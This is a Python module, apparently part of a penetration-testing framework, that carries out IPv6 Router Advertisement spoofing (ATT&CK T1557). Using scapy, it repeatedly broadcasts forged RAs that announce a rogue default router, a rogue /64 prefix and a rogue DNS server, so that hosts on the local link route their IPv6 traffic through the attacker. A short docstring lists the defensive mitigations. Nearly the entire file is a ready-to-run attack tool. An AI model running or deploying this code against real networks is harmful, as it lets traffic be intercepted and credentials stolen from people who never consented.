"""
IPv6 Router Advertisement Spoofing (SLAAC MITM) — T1557

Sends forged IPv6 RAs announcing the attacker as default router
with a rogue /64 prefix. SLAAC hosts auto-configure the rogue
prefix + default route — full v6 MITM even on "IPv4-only" networks
(Windows/Linux prefer IPv6 by default).

Requires: same L2, IPv6 enabled on victims (default on).
Enable IPv6 forwarding on attacker for transparent MITM.

Mitigation: RA Guard on access ports, DHCPv6 Guard, SEND.
"""
import time

from scapy.all import (Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr,
                       ICMPv6NDOptPrefixInfo, ICMPv6NDOptRDNSS, sendp)

NAME = "ra"
DESCRIPTION = "IPv6 RA spoofing (SLAAC) — v6 gateway MITM"
ATTCK_ID = "T1557"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("--prefix", default="fd00:6666::/64", help="Rogue prefix to announce")
    p.add_argument("--lifetime", type=int, default=1800, help="Router lifetime sec")
    p.add_argument("--interval", type=float, default=3.0)
    p.add_argument("-c", "--count", type=int, default=20)
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


def run(args, logger):
    from core.common import require_root, iface_mac
    require_root()
    logger.info("START | technique=%s | iface=%s | prefix=%s", ATTCK_ID, args.interface, args.prefix)
    try:
        src_mac = iface_mac(args.interface)
    except Exception:
        src_mac = "00:11:22:33:44:55"
    try:
        for i in range(args.count):
            pkt = (Ether(dst="33:33:00:00:00:01", src=src_mac) /
                   IPv6(src="fe80::1", dst="ff02::1") /
                   ICMPv6ND_RA(chlim=64, M=0, O=0, prflabel=1,
                               routerlifetime=args.lifetime, reachabletime=0, retranstimer=0) /
                   ICMPv6NDOptSrcLLAddr(lladdr=src_mac) /
                   ICMPv6NDOptPrefixInfo(prefix=args.prefix.split("/")[0], prefixlen=64,
                                         L=1, A=1, validlifetime=2592000, preferredlifetime=604800) /
                   ICMPv6NDOptRDNSS(dns=["fd00:6666::1"]))
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            if (i + 1) % 5 == 0:
                logger.info("[RA] %d/%d prefix=%s", i + 1, args.count, args.prefix)
            time.sleep(args.interval)
        logger.info("END | success=True — victims: ip -6 route should show fe80::1 as default")
        return 0
    except Exception as e:
        logger.error("[RA] Error: %s", e)
        return 1
